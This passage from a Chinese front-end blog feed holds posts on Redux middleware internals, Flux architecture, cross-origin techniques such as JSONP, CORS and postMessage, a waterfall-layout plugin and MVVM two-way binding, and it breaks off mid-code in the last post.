    <content type="text"><![CDATA[宪法修改提案事件在网络上沸沸扬扬，没怎么凑热闹，也不打算（bù gǎn）凑热闹了，还是安安静静地在自留地写点东西好了。 工作时不时需要打开别人的仓库，看到好的代码会精神振奋，上下翻动之余内心也会不停地发出由衷的赞叹，而看到乱糟糟的代码，嘴里就只剩下唏嘘了。一眼扫下去如何判定代码是好是坏呢？大致感觉是这样： 首先会看基本面，空行是不是工整一致，注释是否清晰，行文是否流畅，上下逻辑是否连贯，好的代码一定会看着特别舒服； 然后就是细节啦，看过有代码洁癖的 PHP 程序员写的代码，他们对变量命名、逻辑判断先后顺序、函数分段等各方面都有着自己的思考，那种代码用「优美」来形容完全不过分！ 最后才是代码逻辑，逻辑是整个代码结构设计的核心，它表达出来的是作者的思想。 程序员的信仰是什么？我觉得就是逻辑。因为这个信仰，我们可以坚定地告诉别人，这里是正确的，或者这里是错误的。 我相信很多程序员会不止一次地阅读自己的代（zuò）码（pǐn），有时候想到一个简洁的表达方式，会很激动地删掉一堆冗余逻辑，用几行精简的逻辑替换掉，而且内心还会洋溢着分享的冲动。程序员们在这种习惯中无数次地薰陶后，强迫症自然也就来了。 电脑桌面的文件夹必须放在第 2 排第 1 个位置，因为更好找 结婚照必须斜交 45° 对着沙发 书桌上水杯一定要摆在右手边 30cm 的位置 生活中会不断地挖掘对称美的地方，而且一定会想尽办法减少重复的工作。仿佛生活就是编码，逻辑贯穿其中。 强迫症会让人做出一些看似不可思议的事情，这是强迫症者的生活哲学。他们可以为了偷懒，让自己比平时更忙；他们宁愿丧失部分质量，也不愿意牺牲心中的美；他们钟爱变化，会一直在平淡的生活中寻找趣味的内容。他们是可爱的人。 题图：http://cdn.kickvick.com/wp-content/uploads/2015/07/ocd-imperfection-05.jpg]]></content>
      <categories>
        <category>随笔</category>
        <category>观点和想法</category>
      </categories>
      <tags>
        <tag>强迫症</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redux middleware 源码分析]]></title>
    <url>%2Fblog%2F2018%2F02%2F25%2FRedux-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[middleware 的由来在业务中需要打印每一个 action 信息来调试，又或者希望 dispatch 或 reducer 拥有异步请求的功能。面对这些场景时，一个个修改 dispatch 或 reducer 代码有些乏力，我们需要一个可组合的、自由增减的插件机制，Redux 借鉴了 Koa 中 middleware 的思想，利用它我们可以在前端应用中便捷地实现如日志打印、异步请求等功能。 比如在项目中，进行了如下调用后，redux 就集成了 thunk 函数调用以及打印日志的功能。 1234import thunk from 'redux-thunk'import logger from '../middleware/logger'const enhancer = applyMiddleware(thunk, logger), // 以 redux-thunk、logger 中间件为例介绍中间件的使用const store = createStore(rootReducer, enhancer) 下面追本溯源，来分析下源码。 applyMiddleware 调用入口1234567891011export default function createStore(reducer, preloadedState, enhancer) &#123; // 通过下面代码可以发现，如果 createStore 传入 2 个参数，第二个参数相当于就是 enhancer if (typeof preloadedState === 'function' &amp;&amp; typeof enhancer === 'undefined') &#123; enhancer = preloadedState preloadedState = undefined &#125; if (typeof enhancer !== 'undefined') &#123; return enhancer(createStore)(reducer, preloadedState) &#125; ...&#125; 由上述 createStore 源码发现，applyMiddleware 会进行 applyMiddleware(thunk, logger)(createStore)(reducer, preloadedState) 的调用。 applyMiddleware 源码如下 1234567891011121314151617181920export default function applyMiddleware(...middlewares) &#123; return createStore =&gt; (...args) =&gt; &#123; const store = createStore(...args) let dispatch = store.dispatch let chain = [] const middlewareAPI = &#123; getState: store.getState, // 调用 redux 原生方法，获取状态 dispatch: (...args) =&gt; dispatch(...args) // 调用 redux 原生 dispatch 方法 &#125; // 串行 middleware chain = middlewares.map(middleware =&gt; middleware(middlewareAPI)) dispatch = compose(...chain)(store.dispatch) return &#123; ...store, dispatch // 返回加工过的 dispatch &#125; &#125;&#125; 可以发现 applyMiddleware 的作用其实就是返回加工过的 dispatch，下面会着重分析 middlewares 是如何串行起来的以及 dispatch 是如何被加工的。 串行 middleware123456const middlewareAPI = &#123; getState: store.getState, dispatch: (...args) =&gt; dispatch(...args)&#125;chain = middlewares.map(middleware =&gt; middleware(middlewareAPI))dispatch = compose(...chain)(store.dispatch) 观察上述代码后发现每个 middleware 都会传入参数 middlewareAPI，来看下中间件 logger 的源码 以及 redux-thunk 的源码, 发现中间件接受的第一个参数正是 ({ dispatch, getState }) 12345// logger 源码export default (&#123; dispatch, getState &#125;) =&gt; next =&gt; action =&gt; &#123; console.log(action) return next(action) // 经 compose 源码分析，此处 next 为 Store.dispatch&#125; 1234567// redux-thunk 源码export default (&#123; dispatch, getState &#125;) =&gt; next =&gt; action =&gt; &#123; if (typeof action === 'function') &#123; return action(dispatch) &#125; return next(action) // 此处 next 为 logger 中间件返回的 (action） =&gt; &#123;&#125; 函数&#125; dispatch 是如何被加工的接着上个小节，在 dispatch = compose(...chain)(store.dispatch) 中发现了 compose 函数，来看下 compose 的源码 1234export default function compose(...funcs) &#123; // ... return funcs.reduce((a, b) =&gt; (...args) =&gt; a(b(...args)))&#125; compose 源码中的 funcs.reduce((a, b) =&gt; (...args) =&gt; a(b(...args))) 算是比较重要的一句，它的作用是返回组合参数后的函数，比如 compose(f, g, h) 等价于 (…args) =&gt; f(g(h(…args)))，效果图如下所示，调用 this.props.dispatch() 后，会调用相应的中间件，最终会调用 redux 原生的 store.dispatch()，并且可以看到中间件调用的形式类似数据结构中的栈(先进后出)。 拿上个小节提到的 logger、redux-thunk 中间件为例，其 middleware 的内部串行调用方式如下，从而完成了 dispatch 功能的增强(支持如 this.props.dispatch(func) 的调用以及日志功能)。具体可以看 项目中的运用 123456789action =&gt; &#123; if (typeof action === 'function') &#123; return action(dispatch) &#125; return (action =&gt; &#123; console.log(action) return store.dispatch(action) &#125;)(action)&#125; 参考文献深入React技术栈]]></content>
      <categories>
        <category>redux</category>
      </categories>
      <tags>
        <tag>redux</tag>
        <tag>redux-middleware</tag>
        <tag>redux-thunk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[探索从 MVC 到 MVVM + Flux 架构模式的转变]]></title>
    <url>%2Fblog%2F2018%2F02%2F10%2F%E6%8E%A2%E7%B4%A2%E4%BB%8E-MVC-%E5%88%B0-Flux-%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F%E7%9A%84%E8%BD%AC%E5%8F%98%2F</url>
    <content type="text"><![CDATA[在业务中一般 MVVM 框架一般都会配合上数据状态库(redux, mobx 等)一起使用，本文会通过一个小 demo 来讲述为什么会引人数据状态库。 从 MVC 到 MVVM 模式说起传统 MVC 架构(如 JSP)在当今移动端流量寸土寸金的年代一个比较头疼的问题就是会进行大量的全局重复渲染。但是 MVC 架构是好东西，其对数据、视图、逻辑有了清晰的分工，于是前端 MVC 框架(比如 backbone.js) 出来了，对于很多业务规模不大的场景，前端 MVC 框架已经够用了，它也能做到前后端分离开发单页面应用，那么它的缺陷在哪呢？ 拿 backbone.js 说，它的 Model 对外暴露了 set 方法，也就是说可以在不止一个 View 里修改同个 Model 的数据，然后一个 Model 的数据同时对应多个 View 的呈现，如下图所示。当业务逻辑过多时，多个 Model 和多个 View 就会耦合到一块，可以想到排查 bug 的时候会比较痛苦。 针对传统 MVC 架构性能低(多次全局渲染)以及前端 MVC 框架耦合度高(Model 和 View) 的痛处，MVVM 框架完美地解决了以上两点。可以参阅之前写的 MVVM 框架解析之双向绑定 only MVVM假设有这么一个场景，在输入框中查询条件，点击查询，然后在列表中返回相应内容。如下图所示： 假设用 react 实现，思路大体是先调用查询接口，调用成功后将获取到的数据通过 setState 存进 list 中，列表显示部分代码如下： 123456789101112131415161718const Decorate = (ListComponent) =&gt; class extends Component &#123; constructor() &#123; super() this.state = &#123; list: [] &#125; &#125; componentDidMount() &#123; fetch('./list.json') .then((res) =&gt; res.json()) .then(result =&gt; this.setState(&#123; list: result.data &#125;)) &#125; render() &#123; return ( &lt;ListComponent data=&#123;this.state.list&#125; /&gt; ) &#125;&#125; 接着往封装的 Decorate 组件里，传入无状态函数构建的 List 组件用来展示列表数据，代码如下： 123456789function List(props) &#123; return ( &lt;div&gt; &#123;props.data.map(r =&gt; &lt;p key=&#123;r.id&#125;&gt;&#123;r.content&#125;&lt;/p&gt; )&#125; &lt;/div&gt; )&#125; 可以看到 List 组件相当于是 View 层，而封装的 Decorate 组件相当于是 Model 层。但是这么做还是把业务逻辑写进了组件当中。而我们期望的是能得到一个纯粹的 Model 层和 View 层。接着一起看看 Flux 架构模式是如何解决这个问题的。 引人 Flux 架构模式 Flux 架构模式的 4 个重要组成部分以及它们的关系如上图所示，下文会根据 dispatch，store, action, view 的顺序逐步揭开 Flux 架构模式的面纱。 从 Flux 的源码中可以看出 Dispacher.js 是其的核心文件，其核心是基于事件的发布/订阅模式完成的，核心源码如下： 12345678910111213141516class Dispatcher &#123; ... // 注册回调函数， register(callback) &#123; var id = _prefix + this._lastID++; this._callbacks[id] = callback; &#125; // 当调用 dispatch 的时候会调用 register 中注册的回调函数 dispatch(payload) &#123; this._startDispatching(payload); for (var id in this._callbacks) &#123; this._invokeCallback(id); &#125; &#125;&#125; 回顾下之前的目的：让 Store 层变得纯粹。于是定义了一个变量 comments 用来专门存放列表数据，在了解 Dispatcher 的核心原理之后，当调用 dispatch(obj) 方法时，就可以把参数传递到事先注册的 register 函数中，代码如下： 123456789101112131415// commentStore.jslet comments = []const CommentStore = &#123; getComment() &#123; return comments &#125;&#125;dispathcer.register((action) =&gt; &#123; // 调用 Dispatcher 实例上的 register 函数 switch (action.type) &#123; case 'GET_LIST_SUCCESS': &#123; comments = action.comment &#125; &#125;&#125;) 以及 action 中的函数如下： 123456789101112// commentAction.jsconst commentAction = &#123; getList() &#123; fetch('./list.json') .then((res) =&gt; res.json()) .then(result =&gt; dispathcer.dispatch(&#123; // 调用 Dispatcher 实例上的 dispatch 函数 type: 'GET_LIST_SUCCESS', comment: result.data &#125;)) &#125;&#125; 但是似乎少了点什么，当 GET_LIST_SUCCESS 成功后，发现还缺少通知到页面再次调用 CommentStore.getComment() 的能力，所以再次引用事件发布/订阅模式，这次使用了 Node.js 提供的 events 模块，对 commentStore.js 文件进行修改，修改后代码如下： 1234567891011121314151617181920212223let comments = []const CommentStore = Object.assign(&#123;&#125;, EventEmitter.prototype, &#123; getComment() &#123; return comments &#125;, emitChange() &#123; this.emit('change') &#125;, addListener(callback) &#123; // 提供给页面组件使用 this.on('change', callback) &#125;&#125;)appDispathcer.register((action) =&gt; &#123; switch (action.type) &#123; case 'GET_LIST_SUCCESS': &#123; comments = action.comment CommentStore.emitChange() // 有了这行代码，也就有了通知页面再次进行调用 CommentStore.getComment 的能力 &#125; &#125;&#125;) 剩下最后一步了，就是整合 store 和 action 进页面中，代码如下: 123456789101112131415161718192021222324class ComponentList extends Component &#123; constructor() &#123; super() this.state = &#123; comment: commentStore.getComment() &#125; &#125; componentDidMount() &#123; commentStore.addListener(() =&gt; this.setState(&#123; // 注册函数，上面已经提过，供 store 使用 comment: commentStore.getComment() &#125;)) &#125; render() &#123; return ( &lt;div&gt; &#123;this.state.comment.map(r =&gt; &lt;p key=&#123;r.id&#125;&gt;&#123;r.content&#125;&lt;/p&gt; )&#125; &lt;/div&gt; ) &#125;&#125; 小结单纯以 mvvm 构建应用会发现业务逻辑以及数据都耦合在组件之中，引入了 Flux 架构模式后数据和业务逻辑得到较好的分离。但是使用 Flux 有什么缺点呢？在下篇 《聊聊 Redux 架构模式》中会进行分析，下回见。 本文实践案例已上传至 stateManage 系列博客，欢迎 Star]]></content>
      <categories>
        <category>框架</category>
      </categories>
      <tags>
        <tag>框架</tag>
        <tag>状态管理</tag>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跨域二三事]]></title>
    <url>%2Fblog%2F2018%2F02%2F04%2F%E8%B7%A8%E5%9F%9F%E4%BA%8C%E4%B8%89%E4%BA%8B%2F</url>
    <content type="text"><![CDATA[跨域是日常开发中经常开发中经常会接触到的一个重难点知识，何不总结实践一番，从此心中对之了无牵挂。 同源策略之所以会出现跨域解决方案，是因为同源策略的限制。同源策略规定了如果两个 url 的协议、域名、端口中有任何一个不等，就认定它们跨源了。比如下列表格列出和 http://127.0.0.1:3000 比较的同源检测的结果， url 结果 原因 http://127.0.0.1:3000/index 同源 https://127.0.0.1:3000 跨源 协议不同 https://localhost:3000 跨源 域名不同 http://127.0.0.1:3001 跨源 端口不同 那跨源有什么后果呢？归纳有三：不能获取 Cookie、LocalStorage、IndexedDB；不能获取 dom 节点；不能进行一般的 Ajax 通信；跨域解决方案的出现就是为了解决以上痛处。 JSONP 跨域提到 JSONP 跨域，不得不先提到 script 标签，和 img、iframe 标签类似，这些标签是不受同源策略限制的，JSONP 的核心就是通过动态加载 script 标签来完成对目标 url 的请求。 先来看一段 JSONP 调用的 Headers 部分，字段如下： 1234Request URL:http://127.0.0.1:3000/?callback=handleResponseRequest Method:GETStatus Code:200 OKRemote Address:127.0.0.1:3000 可以很鲜明地发现在 Request URL 中有一句 ?callback=handleResponse，这个 callback 后面跟着的 handleResponse 即回调函数名（可以任意取），服务端会接收到这个参数然后拼接成形如 handleResponse(JSON) 的形式返还给前端(这也是 JSONP == JSON with padding 的原因吧)，如下图，这时候浏览器就会自动调用我们事先定义好的 handleResponse 函数。 前端代码示例：(源为 http://127.0.0.1:3001) 1234567function handleResponse(res) &#123; console.log(res) // &#123;text: "jsonp"&#125;&#125;const script = document.createElement('script')script.src = 'http://127.0.0.1:3000?callback=handleResponse'document.head.appendChild(script) 服务端代码示例：(源为 http://127.0.0.1:3000) 1234567891011const server = http.createServer((req, res) =&gt; &#123; if (~req.url.indexOf('?callback')) &#123; // 简单处理 JSONP 跨域的时候 const obj = &#123; "text": 'jsonp', &#125; const callback = req.url.split('callback=')[1] const json = JSON.stringify(obj) const build = callback + `($&#123;json&#125;)` res.end(build) // 这里返还给前端的是拼接好的 JSON 对象 &#125;&#125;); 可以看出 JSONP 具有直接访问响应文本的优点，但是要想确认 JSONP 是否请求失败并不容易，因为 script 标签的 onerror 事件还未得到浏览器广泛的支持，此外它仅能支持 GET 方式调用。 CORS 跨域CORS(Cross-Origin Resource Sharing) 可以理解为加强版的 Ajax，也是目前主流的跨域解决方案。它的核心思想即前端与后端进行 Ajax 通信时，通过自定义 HTTP 头部设置从而决定请求或响应是否生效。 比如前端代码(url 为 http://127.0.0.1:3001)写了段 Ajax，代码如下： 12345678910const xhr = new XMLHttpRequest()xhr.onreadystatechange = function () &#123; if (xhr.readyState === 4) &#123; if (xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300 || xhr.status === 304) &#123; console.log('responseTesx:' + xhr.responseText) &#125; &#125;&#125;xhr.open('get', 'http://127.0.0.1:3000', true)xhr.send() 因为端口不一致的关系这时候导致不同源了，这时候会在 Request Headers 中发现多了这么一行字段， 1Origin: http://127.0.0.1:3001 而且控制台中会报出如下错误: 1Failed to load http://127.0.0.1:3000/: Response to preflight request doesn't pass access control check: No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://127.0.0.1:3001' is therefore not allowed access. 这时候就需要在服务端设置字段 Access-Control-Allow-Origin，它的作用就是设置允许来自什么源的请求，如果值设置为 *，表明允许来自任意源的请求。服务端代码示例如下： 123http.createServer((req, res) =&gt; &#123; res.setHeader('Access-Control-Allow-Origin', 'http://127.0.0.1:3001') // 设置允许来自 http://127.0.0.1:3001 源的请求&#125;) CORS 分为简单请求以及非简单请求。可以这么区分，如果请求方法为 POST、GET、HEAD 时为简单请求，其它方法如 PUT、DELETE 等为非简单请求，如果是非简单请求的话，可以在 chrome 的 Network 中看到多了一次 Request Method 为 OPTIONS 的请求。如下图: 可以把这个请求称为预请求，用白话文翻译下，浏览器询问服务器，’服务器大哥，我这次要进行 PUT 请求，你给我发张通行证呗’，服务器大哥见浏览器小弟这么殷勤，于是给了它发了张通行证，叫作 Access-Control-Allow-Methods:PUT，接着浏览器就能愉快地进行 PUT 请求了。服务端代码示例如下： 1234http.createServer((req, res) =&gt; &#123; res.setHeader('Access-Control-Allow-Origin', 'http://127.0.0.1:3001') res.setHeader('Access-Control-Allow-Methods', 'PUT')&#125;) 聊完简单请求和非简单请求的区别后，再来看看如何利用 CORS 实现 Cookie 的跨域传送，首先在服务器随意设置个 Cookie 值下发到浏览器，如果非跨域的情况下，浏览器再次请求服务器时就会带上服务器给的 Cookie，但是跨域的时候怎么办呢？不卖关子了，需在服务端设置 Access-Control-Allow-Credentials 字段以及在客户端设置 withCredentials 字段，两者缺一不可，代码如下： 前端代码示例：(源为 http://127.0.0.1:3001) 12345const xhr = new XMLHttpRequest()...xhr.withCredentials = true // 传 cookie 的时候前端要做的xhr.open('get', 'http://127.0.0.1:3000', true)xhr.send() 服务端代码示例: (源为 http://127.0.0.1:3000) 123456const server = http.createServer((req, res) =&gt; &#123; res.setHeader('Access-Control-Allow-Origin', 'http://127.0.0.1:3001') // 必填：接受域的请求 res.setHeader('Set-Cookie', ['type=muyy']) // 下发 cookie res.setHeader('Access-Control-Allow-Credentials', true) // ② 选填：是否允许浏览器传 cookie 到服务端，只能设置为 true res.end('date from cors')&#125;) 至此介绍了几个比较关键 HTTP 头在 CORS 中的实践运用，更为详细的资料可以参阅 Cross-Origin Resource Sharing，最后概括下 CORS 的优缺点，优点是支持所有类型的 HTTP 方法，缺点是有些老的浏览器不支持 CORS。 hash + iframe在文章最开始提到过 iframe 标签也是不受同源策略限制的标签之一，hash + iframe 的跨域核心思想就是，在 A 源中通过动态改变 iframe 标签的 src 的哈希值，在 B 源中通过 window.onhashchange 来捕获到相应的哈希值。思路不难直接上代码： A 页面代码示例(源为 http://127.0.0.1:3000) 1234567891011&lt;body&gt; &lt;iframe src="http://127.0.0.1:3001"&gt;&lt;/iframe&gt; &lt;script&gt; const iframe = document.getElementsByTagName('iframe')[0] iframe.setAttribute('style', 'display: none') const obj = &#123; data: 'hash' &#125; iframe.src = iframe.src + '#' + JSON.stringify(obj) // ① 关键语句 &lt;/script&gt;&lt;/body&gt; B 页面代码示例(源为 http://127.0.0.1:3001) 123window.onhashchange = function() &#123; // ① 关键语句 console.log('来自 page2 的代码 ' + window.location.hash) // 来自 page2 的代码 #&#123;"data":"hash"&#125;&#125; 刷新 A 页面，可以发现在控制台打印了如下字段，至此实现了跨域。 1来自 page2 的代码 #&#123;"data":"hash"&#125; 这种方式进行跨域优点是支持页面和页面间的通信，缺点也是只支持 GET 方法和单向的跨域通信。 postMessage为了实现跨文档传送(cross-document messaging)，简称 XDM。HTML5 给出了一个 api —— postMessage，postMessage() 方法接收两个参数：发送消息以及消息接收方所在域的字符串。代码示例如下: A 页面代码示例(源为 http://127.0.0.1:3000) 12345678910&lt;body&gt; &lt;iframe src="http://127.0.0.1:3001"&gt;&lt;/iframe&gt; &lt;script&gt; const iframe = document.getElementsByTagName('iframe')[0] iframe.setAttribute('style', 'display: none') iframe.onload = function() &#123; // 此处要等 iframe 加载完毕，后续代码才会生效 iframe.contentWindow.postMessage('a secret', 'http://127.0.0.1:3001') &#125; &lt;/script&gt;&lt;/body&gt; B 页面代码示例(源为 http://127.0.0.1:3001) 1234window.addEventListener('message', function(event) &#123; console.log('From page1 ' + event.data) console.log('From page1 ' + event.origin)&#125;, false) 刷新 A 页面，可以发现在控制台打印了如下字段，至此实现了跨域。 12From page1 a secretFrom page1 http://127.0.0.1:3000 这种跨域方式优点是是支持页面和页面间的双向通信，缺点也是只能支持 GET 方法调用。 WebSocketsWebSockets 属于 HTML5 的协议，它的目的是在一个持久连接上建立全双工通信。由于 WebSockets 采用了自定义协议，所以优点是客户端和服务端发送数据量少，缺点是要额外的服务器。基础的使用方法如下： 12345678910111213141516const ws = new WebSocket('ws://127.0.0.1:3000')ws.onopen = function() &#123; // 连接成功建立&#125;ws.onmessage = function(event) &#123; // 处理数据&#125;ws.onerror = function() &#123; // 发生错误时触发，连接中断&#125;ws.onclose = function() &#123; // 连接关闭时触发&#125; 当然一般我们会使用封装好 WebSockets 的第三方库 socket.io，这里具体就不展开了。 项目地址前文所述五种跨域实践的 demo 已上传至 cross-domain，前端环境基于 create-react-app 搭建，后端环境用 node 搭建。 当然跨域方式还有一些其他方式的实现，后续酌情慢慢填坑~]]></content>
      <categories>
        <category>跨域</category>
      </categories>
      <tags>
        <tag>跨域</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[原生 JS 实现一个瀑布流插件]]></title>
    <url>%2Fblog%2F2018%2F01%2F30%2F%E5%8E%9F%E7%94%9FJS%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%80%91%E5%B8%83%E6%B5%81%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[瀑布流布局中的图片有一个核心特点 —— 等宽不定等高，瀑布流布局在国内外网站都有一定规模的使用，比如pinterest、花瓣网等等。那么接下来就基于这个特点开始瀑布流探索之旅。 基础功能实现首先我们定义好一个有 20 张图片的容器， 1234567891011121314151617181920&lt;body&gt; &lt;style&gt; #waterfall &#123; position: relative; &#125; .waterfall-box &#123; float: left; width: 200px; &#125; &lt;/style&gt;&lt;/body&gt;&lt;div id="waterfall"&gt; &lt;img src="images/1.png" class="waterfall-box"&gt; &lt;img src="images/2.png" class="waterfall-box"&gt; &lt;img src="images/3.png" class="waterfall-box"&gt; &lt;img src="images/4.png" class="waterfall-box"&gt; &lt;img src="images/5.png" class="waterfall-box"&gt; &lt;img src="images/6.png" class="waterfall-box"&gt; ... &lt;/div&gt; 由于未知的 css 知识点，丝袜最长的妹子把下面的空间都占用掉了。。。 接着正文，假如如上图，每排有 5 列，那第 6 张图片应该出现前 5 张图片哪张的下面呢？当然是绝对定位到前 5 张图片高度最小的图片下方。 那第 7 张图片呢？这时候把第 6 张图片和在它上面的图片当作是一个整体后，思路和上述是一致的。代码实现如下: 12345678910111213141516171819Waterfall.prototype.init = function () &#123; ... const perNum = this.getPerNum() // 获取每排图片数 const perList = [] // 存储第一列的各图片的高度 for (let i = 0; i &lt; perNum; i++) &#123; perList.push(imgList[i].offsetHeight) &#125; let pointer = this.getMinPointer(perList) // 求出当前最小高度的数组下标 for (let i = perNum; i &lt; imgList.length; i++) &#123; imgList[i].style.position = 'absolute' // 核心语句 imgList[i].style.left = `$&#123;imgList[pointer].offsetLeft&#125;px` imgList[i].style.top = `$&#123;perList[pointer]&#125;px` perList[pointer] = perList[pointer] + imgList[i].offsetHeight // 数组最小的值加上相应图片的高度 pointer = this.getMinPointer(perList) &#125;&#125; 细心的朋友也许发现了代码中获取图片的高度用到了 offsetHeight 这个属性，这个属性的高度之和等于图片高度 + 内边距 + 边框，正因为此，我们用了 padding 而不是 margin 来设置图片与图片之间的距离。此外除了offsetHeight 属性，此外还要理解 offsetHeight、clientHeight、offsetTop、scrollTop 等属性的区别，才能比较好的理解这个项目。css 代码简单如下：123456.waterfall-box &#123; float: left; width: 200px; padding-left: 10px; padding-bottom: 10px;&#125; 至此完成了瀑布流的基本布局，效果图如下： scroll、resize 事件监听的实现实现了初始化函数 init 以后，下一步就要实现对 scroll 滚动事件进行监听，从而实现当滚到父节点的底部有源源不断的图片被加载出来的效果。这时候要考虑一个点，是滚动到什么位置时触发加载函数呢？这个因人而异，我的做法是当满足 父容器高度 + 滚动距离 &gt; 最后一张图片的 offsetTop 这个条件，即橙色线条 + 紫色线条 &gt; 蓝色线条时触发加载函数，代码如下： 12345678910111213window.onscroll = function() &#123; // ... if (scrollPX + bsHeight &gt; imgList[imgList.length - 1].offsetTop) &#123;// 浏览器高度 + 滚动距离 &gt; 最后一张图片的 offsetTop const fragment = document.createDocumentFragment() for(let i = 0; i &lt; 20; i++) &#123; const img = document.createElement('img') img.setAttribute('src', `images/$&#123;i+1&#125;.png`) img.setAttribute('class', 'waterfall-box') fragment.appendChild(img) &#125; $waterfall.appendChild(fragment) &#125;&#125; 因为父节点可能自定义节点，所以提供了对监听 scroll 函数的封装，代码如下：12345678910proto.bind = function () &#123; const bindScrollElem = document.getElementById(this.opts.scrollElem) util.addEventListener(bindScrollElem || window, 'scroll', scroll.bind(this))&#125;const util = &#123; addEventListener: function (elem, evName, func) &#123; elem.addEventListener(evName, func, false) &#125;,&#125; resize 事件的监听与 scroll 事件监听大同小异，当触发了 resize 函数，调用 init 函数进行重置就行。 使用发布-订阅模式和继承实现监听绑定既然以开发插件为目标，不能仅仅满足于功能的实现，还要留出相应的操作空间给开发者自行处理。联想到业务场景中瀑布流中下拉加载的图片一般都来自 Ajax 异步获取，那么加载的数据必然不能写死在库里，期望能实现如下调用(此处借鉴了 waterfall 的使用方式)， 12345const waterfall = new Waterfall(&#123;options&#125;)waterfall.on("load", function () &#123; // 此处进行 ajax 同步/异步添加图片&#125;) 观察调用方式，不难联想到使用发布/订阅模式来实现它，关于发布/订阅模式，之前在 Node.js 异步异闻录 有介绍它。其核心思想即通过订阅函数将函数添加到缓存中，然后通过发布函数实现异步调用，下面给出其代码实现: 1234567891011121314151617function eventEmitter() &#123; this.sub = &#123;&#125;&#125;eventEmitter.prototype.on = function (eventName, func) &#123; // 订阅函数 if (!this.sub[eventName]) &#123; this.sub[eventName] = [] &#125; this.sub[eventName].push(func) // 添加事件监听器&#125;eventEmitter.prototype.emit = function (eventName) &#123; // 发布函数 const argsList = Array.prototype.slice.call(arguments, 1) for (let i = 0, length = this.sub[eventName].length; i &lt; length; i++) &#123; this.sub[eventName][i].apply(this, argsList) // 调用事件监听器 &#125;&#125; 接着，要让 Waterfall 能使用发布/订阅模式，只需让 Waterfall 继承 eventEmitter 函数，代码实现如下: 1234567function Waterfall(options = &#123;&#125;) &#123; eventEmitter.call(this) this.init(options) // 这个 this 是 new 的时候，绑上去的&#125;Waterfall.prototype = Object.create(eventEmitter.prototype)Waterfall.prototype.constructor = Waterfall 继承方式的写法吸收了基于构造函数继承和基于原型链继承两种写法的优点，以及使用 Object.create 隔离了子类和父类，关于继承更多方面的细节，可以另写一篇文章了，此处点到为止。 小优化为了防止 scroll 事件触发多次加载图片，可以考虑用函数防抖与节流实现。在基于发布-订阅模式的基础上，定义了个 isLoading 参数表示是否在加载中，并根据其布尔值决定是否加载，代码如下： 12345678910111213141516let isLoading = falseconst scroll = function () &#123; if (isLoading) return false // 避免一次触发事件多次 if (scrollPX + bsHeight &gt; imgList[imgList.length - 1].offsetTop) &#123; // 浏览器高度 + 滚动距离 &gt; 最后一张图片的 offsetTop isLoading = true this.emit('load') &#125;&#125;proto.done = function () &#123; this.on('done', function () &#123; isLoading = false ... &#125;) this.emit('done')&#125; 这时候需要在调用的地方加上 waterfall.done, 从而告知当前图片已经加载完毕，代码如下: 12345const waterfall = new Waterfall(&#123;&#125;)waterfall.on("load", function () &#123; // 异步/同步加载图片 waterfall.done()&#125;) 项目地址项目地址 此插件在 React 项目中的运用 项目简陋，不足之处在所难免，欢迎留下你们宝贵的意见。]]></content>
      <categories>
        <category>轮子</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>瀑布流</tag>
        <tag>轮子</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MVVM 框架解析之双向绑定]]></title>
    <url>%2Fblog%2F2018%2F01%2F16%2FMVVM%20%E6%A1%86%E6%9E%B6%E8%A7%A3%E6%9E%90%E4%B9%8B%E5%8F%8C%E5%90%91%E7%BB%91%E5%AE%9A%2F</url>
    <content type="text"><![CDATA[MVVM 框架近年来前端一个明显的开发趋势就是架构从传统的 MVC 模式向 MVVM 模式迁移。在传统的 MVC 下，当前前端和后端发生数据交互后会刷新整个页面，从而导致比较差的用户体验。因此我们通过 Ajax 的方式和网关 REST API 作通讯，异步的刷新页面的某个区块，来优化和提升体验。 MVVM 框架基本概念 在 MVVM 框架中，View(视图) 和 Model(数据) 是不可以直接通讯的，在它们之间存在着 ViewModel 这个中间介充当着观察者的角色。当用户操作 View(视图)，ViewModel 感知到变化，然后通知 Model 发生相应改变；反之当 Model(数据) 发生改变，ViewModel 也能感知到变化，使 View 作出相应更新。这个一来一回的过程就是我们所熟知的双向绑定。 MVVM 框架的应用场景MVVM 框架的好处显而易见：当前端对数据进行操作的时候，可以通过 Ajax 请求对数据持久化，只需改变 dom 里需要改变的那部分数据内容，而不必刷新整个页面。特别是在移动端，刷新页面的代价太昂贵。虽然有些资源会被缓存，但是页面的 dom、css、js 都会被浏览器重新解析一遍，因此移动端页面通常会被做成 SPA 单页应用。由此在这基础上诞生了很多 MVVM 框架，比如 React.js、Vue.js、Angular.js 等等。 MVVM 框架的简单实现 贴士：这篇文章主要是针对 vue 的双向绑定实现，React 中其实并没有双向绑定这一说。 模拟 Vue 的双向绑定流，实现了一个简单的 MVVM 框架，从上图中可以看出虚线方形中就是之前提到的 ViewModel 中间介层，它充当着观察者的角色。另外可以发现双向绑定流中的 View 到 Model 其实是通过 input 的事件监听函数实现的，如果换成 React(单向绑定流) 的话，它在这一步交给状态管理工具(比如 Redux)来实现。另外双向绑定流中的 Model 到 View 其实各个 MVVM 框架实现的都是大同小异的，都用到的核心方法是 Object.defineProperty()，通过这个方法可以进行数据劫持，当数据发生变化时可以捕捉到相应变化，从而进行后续的处理。 Mvvm(入口文件) 的实现一般会这样调用 Mvvm 框架 1234567const vm = new Mvvm(&#123; el: '#app', data: &#123; title: 'mvvm title', name: 'mvvm name' &#125;, &#125;) 但是这样子的话，如果要得到 title 属性就要形如 vm.data.title 这样取得，为了让 vm.title 就能获得 title 属性，从而在 Mvvm 的 prototype 上加上一个代理方法，代码如下：12345678910111213141516171819202122function Mvvm (options) &#123; this.data = options.data const self = this Object.keys(this.data).forEach(key =&gt; self.proxyKeys(key) )&#125;Mvvm.prototype = &#123; proxyKeys: function(key) &#123; const self = this Object.defineProperty(this, key, &#123; get: function () 